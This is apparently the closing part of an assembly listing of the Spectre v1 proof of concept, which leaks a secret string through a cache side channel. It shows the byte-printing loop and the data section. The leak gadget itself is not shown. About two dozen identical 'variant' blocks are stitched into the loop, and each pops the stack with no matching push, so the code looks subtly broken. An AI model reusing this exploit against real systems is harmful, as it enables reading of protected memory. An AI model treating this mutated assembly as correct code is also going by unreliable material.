## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 76
.Lmain_win0_var76:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 77
.Lmain_win0_var77:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 78
.Lmain_win0_var78:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 79
.Lmain_win0_var79:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 80
.Lmain_win0_var80:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 81
.Lmain_win0_var81:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 82
.Lmain_win0_var82:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 83
.Lmain_win0_var83:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 84
.Lmain_win0_var84:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 85
.Lmain_win0_var85:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 86
.Lmain_win0_var86:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 87
.Lmain_win0_var87:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 88
.Lmain_win0_var88:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 89
.Lmain_win0_var89:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 90
.Lmain_win0_var90:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 91
.Lmain_win0_var91:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 92
.Lmain_win0_var92:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 93
.Lmain_win0_var93:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 94
.Lmain_win0_var94:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 95
.Lmain_win0_var95:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 96
.Lmain_win0_var96:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 97
.Lmain_win0_var97:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 98
.Lmain_win0_var98:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 99
.Lmain_win0_var99:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
.Lmain_win0_continue:
	jmp	LBB4_8
LBB4_7:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	$63, %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_8:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	-52(%rbp), %esi    # # 4-byte Reload
	movl	-56(%rbp), %edx    # # 4-byte Reload
	leaq	L_.str.8(%rip), %rdi
	movb	$0, %al
	callq	_printf
	jmp	LBB4_3
LBB4_9:
	leaq	L_.str.9(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rdi
	callq	_free
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB4_11
## %bb.10:
	xorl	%eax, %eax
	addq	$64, %rsp
	popq	%rbp
	retq
LBB4_11:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__cstring,cstring_literals
L_.str:                                 ## @.str
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.section	__DATA,__data
	.globl	_secret                         ## @secret
	.p2align	3, 0x0
_secret:
	.quad	L_.str
	.comm	_channel,262144,4               ## @channel
	.comm	_target,8,3                     ## @target
	.section	__TEXT,__cstring,cstring_literals
	L_.str.1	:    # # @.str.1
	.asciz	"%p"
	L_.str.2	:    # # @.str.2
	.asciz	"%d"
	L_.str.3	:    # # @.str.3
	.asciz	"Reading %d bytes starting at %p:\n"
	L_.str.4	:    # # @.str.4
	.asciz	"reading %p..."
	L_.str.5	:    # # @.str.5
	.asciz	"%s: "
	L_.str.6	:    # # @.str.6
	.asciz	"success"
	L_.str.7	:    # # @.str.7
	.asciz	"unclear"
	L_.str.8	:    # # @.str.8
	.asciz	"0x%02X='%c'\n"
	L_.str.9	:    # # @.str.9
	.asciz	"\n"
.subsections_via_symbols
